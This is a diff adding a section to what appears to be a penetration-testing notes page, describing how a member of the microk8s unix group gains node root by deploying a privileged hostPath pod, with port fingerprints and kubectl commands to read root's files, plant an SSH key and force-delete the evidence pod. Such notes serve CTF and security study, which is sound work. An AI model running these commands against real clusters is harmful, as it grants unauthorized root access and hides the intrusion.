@@ -382,3 +382,28 @@ kubectl auth can-i get secret/terminal-creds \
 - Kubernetes official documentation: `kubernetes.io/docs/`
 - Related pages: [[docker-attacks]], [[cloud-iam-attacks]], [[linux-privesc]]
 - `0xdf-containers`: Unobtainium (electron → kube creds → cluster takeover)
+
+## MicroK8s: `microk8s` unix group -> node root (local privesc)
+
+A local user in the **`microk8s`** unix group drives the cluster with **no token**: `microk8s
+kubectl` reads the group-readable client config/socket, so an otherwise-unprivileged shell user gets
+`kubectl auth can-i create pods` = `yes`. This is a GTFOBins-style group->root, distinct from the
+compromised-service-account / RBAC paths above - the entry is unix group membership (`id` shows
+`microk8s`), not a stolen SA token.
+
+Fingerprint (nmap): MicroK8s exposes API `16443`, kubelet `10250`, read-only kubelet `10255`,
+cluster-agent `25000`, and often a built-in registry `32000`. These ports together = MicroK8s.
+
+Escalate by creating a privileged `hostPath: /` pod (same manifest as the privileged-pod section
+above), using a **locally-cached** image so it schedules with no internet pull:
+
+```
+# list cached / in-use images WITHOUT root (`microk8s ctr images ls` needs sudo):
+microk8s kubectl get pods -A -o jsonpath='{..image}'
+# deploy the privileged pod (image = a cached one, e.g. localhost:32000/<img> from the registry):
+microk8s kubectl apply -f pwn.yaml
+microk8s kubectl exec pwn -- cat /host/root/root.txt   # or drop an SSH key / chroot for a root shell
+microk8s kubectl delete pod pwn --grace-period=0 --force   # cleanup
+```
+
+<!-- promoted-slug: microk8s-group-privesc -->
